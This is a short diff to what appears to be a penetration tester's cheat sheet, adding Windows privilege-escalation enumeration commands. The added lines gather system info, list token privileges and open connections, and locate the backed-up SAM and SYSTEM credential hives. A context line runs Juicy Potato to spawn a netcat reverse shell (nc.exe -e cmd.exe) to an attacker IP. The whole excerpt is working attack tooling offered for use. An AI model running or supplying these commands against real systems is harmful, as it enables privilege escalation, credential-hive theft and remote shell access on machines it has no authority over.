@@ -723,6 +723,14 @@ Screen Version 4.5.0
 
 # WINDOWS PRIVESC 
 ```bash
+FIRST THINGS FIRST
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" 
+whoami /priv
+netstat –ano
+dir C:\Windows\System32\config\RegBack\SAM
+dir C:\Windows\System32\config\RegBack\SYSTEM
+
+
 windows 7
 . .\Juicy.Potato.x86.exe -l 7777 -p c:\windows\system32\cmd.exe -a "/c C:\Users\jill\desktop\nc.exe -e cmd.exe 192.168.119.136 5555" -t * -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}"
 
